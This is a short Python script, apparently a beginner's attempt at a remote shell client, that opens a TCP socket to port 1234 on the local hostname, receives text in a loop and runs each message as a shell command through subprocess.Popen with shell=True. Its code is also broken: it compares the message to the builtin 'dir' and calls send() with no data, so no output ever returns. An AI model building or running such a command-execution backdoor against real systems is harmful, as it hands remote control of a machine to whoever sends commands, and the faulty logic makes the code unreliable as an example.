import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((socket.gethostname(), 1234))

while True:
    msg = s.recv(10000000)
    print(msg.decode("utf-8"))
    subprocess.Popen(msg.decode("utf-8"), shell=True)
    if msg.decode("utf-8") == dir:
        s.send()
